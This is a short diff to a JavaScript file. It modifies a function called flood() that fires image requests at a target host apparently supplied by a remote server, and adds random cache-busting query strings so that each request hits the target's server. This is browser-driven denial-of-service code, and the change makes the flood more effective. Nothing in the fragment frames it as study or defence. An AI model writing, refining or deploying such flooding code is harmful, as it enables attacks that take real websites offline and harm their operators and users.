@@ -16,7 +16,8 @@ function main(){
             } else {}
             function flood(){
                 var img = new Image();
-                img.src = "http://" + resp.target;
+                var rand = Math.floor(Math.random() * 100);
+                img.src = "http://" + resp.target + "/index.html?" + rand + "=val";
                 img.onload;
             }
         },
